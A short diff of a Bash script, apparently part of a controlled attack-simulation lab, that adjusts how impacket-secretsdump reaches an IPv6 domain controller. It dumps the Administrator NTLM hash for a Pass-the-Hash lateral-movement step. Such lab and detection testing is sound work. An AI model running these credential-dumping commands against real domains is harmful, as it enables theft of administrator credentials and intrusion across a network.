@@ -24,9 +24,13 @@ echo "=== Escenario 2: Simulacion de ataques controlados (${REPETICIONES}x cada 
 # Pass-the-Hash, tal como ocurriria en una cadena de ataque real: se captura
 # una vez y se reutiliza para movimiento lateral.
 NTHASH=""
+# Dual-stack: con un DC IPv6, Impacket no resuelve 'user@[IPv6]'; se usa
+# -target-ip con la IPv6 y el nombre del DC para la sesion SMB.
+SDUMP_TIP=(); SDUMP_HOST="${DC_IP}"
+case "$DC_IP" in *:*) SDUMP_TIP=(-target-ip "$DC_IP"); SDUMP_HOST="dc-empresa";; esac
 if command -v impacket-secretsdump &>/dev/null; then
   echo "[*] Capturando hash NTLM del DC (secretsdump) para Pass-the-Hash..."
-  OUT="$(impacket-secretsdump "${DOMAIN_ADMIN%/*}/Administrator:${DOMAIN_ADMIN_PASS}@${DC_IP}" 2>/dev/null || true)"
+  OUT="$(impacket-secretsdump "${SDUMP_TIP[@]}" "${DOMAIN_ADMIN%/*}/Administrator:${DOMAIN_ADMIN_PASS}@${SDUMP_HOST}" 2>/dev/null || true)"
   NTHASH="$(echo "$OUT" | grep -m1 '^Administrator:500:' | cut -d: -f4)"
   [ -n "$NTHASH" ] && echo "[*] Hash NTLM capturado." || echo "[!] No se pudo capturar el hash; se omitira Pass-the-Hash."
 fi
